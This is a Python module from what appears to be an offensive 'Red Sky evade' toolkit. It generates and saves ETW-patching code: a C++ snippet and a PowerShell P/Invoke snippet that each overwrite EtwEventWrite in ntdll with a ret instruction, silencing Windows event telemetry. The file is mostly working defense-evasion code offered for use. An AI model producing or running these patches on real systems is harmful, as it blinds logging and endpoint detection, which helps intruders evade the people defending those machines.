# language: Python, file: Program/evade/etw.py, target: Red Sky evade — ETW patch
# Generate ETW patch code. Patches EtwEventWrite in ntdll to a single ret so
# .NET and native telemetry stops reporting to the OS event log.

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


CPP_PATCH = r'''// language: C++, target: patch EtwEventWrite in ntdll
// Overwrites the prologue with `ret` — ETW provider calls become no-ops.

#include <windows.h>

static void PatchEtw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    void* evt = (void*)GetProcAddress(ntdll, "EtwEventWrite");
    if (!evt) return;
    DWORD old;
    VirtualProtect(evt, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)evt = 0xC3;  // ret
    VirtualProtect(evt, 1, old, &old);
}
'''


PS_PATCH = r'''# PowerShell — patch EtwEventWrite via P/Invoke
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Run() {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr evt = GetProcAddress(ntdll, "EtwEventWrite");
        uint old;
        VirtualProtect(evt, (UIntPtr)1, 0x40, out old);
        Marshal.WriteByte(evt, 0xC3);
        VirtualProtect(evt, (UIntPtr)1, old, out old);
    }
}
"@
[EtwPatch]::Run()
'''


TECHNIQUES = {
    "cpp": ("C++ EtwEventWrite -> ret", CPP_PATCH),
    "ps":  ("PowerShell P/Invoke patch", PS_PATCH),
}


def cmd_list() -> int:
    print_info(f"{len(TECHNIQUES)} ETW patch techniques")
    print()
    for key, (name, _) in TECHNIQUES.items():
        print(f"  {ARTERY}▓{RESET} {BONE}{key:<8}{RESET} {name}")
    return 0


def cmd_gen(technique: str, out_file: str = "") -> int:
    if technique not in TECHNIQUES:
        print_err(f"unknown technique: {technique}")
        print_info(f"available: {', '.join(TECHNIQUES.keys())}")
        return 2

    name, code = TECHNIQUES[technique]
    print_info(name)
    print()
    print(code)

    ext = {"cpp": ".cpp", "ps": ".ps1"}[technique]
    out = Path(out_file) if out_file else OUTPUT_DIR / "evade" / f"etw_{technique}{ext}"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(code)
    print()
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if not args or args[0] == "list":
        return cmd_list()
    return cmd_gen(args[0], args[1] if len(args) > 1 else "")


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
